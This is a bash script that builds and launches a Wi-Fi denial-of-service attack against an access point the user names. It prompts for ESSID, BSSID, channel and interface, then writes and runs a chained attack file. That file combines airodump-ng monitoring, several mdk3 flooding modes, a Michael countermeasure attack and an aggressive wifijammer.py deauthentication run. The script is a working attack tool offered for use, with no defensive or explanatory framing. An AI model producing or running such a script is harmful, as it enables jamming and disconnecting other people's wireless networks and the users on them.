#!/bin/bash

echo " "
echo "Opened new terminal !!!"
echo " "
echo "Write and save -> <ESSID> <BSSID> <Ch> <iface>"
echo " "
echo "example -> Network 1A:2B:3C:4D:5E:6F 1 wlan0"
echo " " 

qterminal -e nano Target-AP.txt

sed -i -e 's/  */ /g' -e 's/^[[:blank:]]*//' -e 's/[[:blank:]]*$//' Target-AP.txt

echo -e '#!/bin/bash\n' > "attack-$(cut -d ' ' -f 2 Target-AP.txt | sed 's/://g').sh"
echo "timeout 32m xterm -geometry '65x25+0+0' -e 'airodump-ng -c <Ch> --bssid <BSSID> <iface>' | timeout 34m xterm -geometry '65x25+403+0' -e 'sleep 8m && mdk3 <iface> a -a <BSSID>' | timeout 33m xterm -geometry '65x25+806+0' -e 'sleep 8m 40s && mdk3 <iface> x 0 -t <BSSID> -n <ESSID> -s 200' | timeout 31m xterm -geometry '65x25+0+392' -e 'sleep 25m && echo \"Michael attack begining !!!\" && mdk3 <iface> m -t <BSSID>' | timeout 35m xterm -geometry '65x25+403+392' -e 'sleep 26m 2s && python3 /root/wifijammer/wifijammer.py -a <BSSID> -c <Ch> -i <iface> --aggressive'" >> "attack-$(cut -d ' ' -f 2 Target-AP.txt | sed 's/://g').sh"

sed -i -e "s/<ESSID>/$(cut -d ' ' -f 1 Target-AP.txt)/g" -e "s/<BSSID>/$(cut -d ' ' -f 2 Target-AP.txt)/g" -e "s/<Ch>/$(cut -d ' ' -f 3 Target-AP.txt)/g" -e "s/<iface>/$(cut -d ' ' -f 4 Target-AP.txt)/g" "attack-$(cut -d ' ' -f 2 Target-AP.txt | sed 's/://g').sh"

chmod +x *.sh

echo " "
read -p "Do you want now attack? (y/n) " RESP
echo " "
if [ "$RESP" = "y" ]; then
  echo "READY ATTACKING !!!"
  echo " "
else
  echo "Use attack file -> ./attack-$(cut -d ' ' -f 2 Target-AP.txt | sed 's/://g').sh"
  exit
fi

./"attack-$(cut -d ' ' -f 2 Target-AP.txt | sed 's/://g').sh"
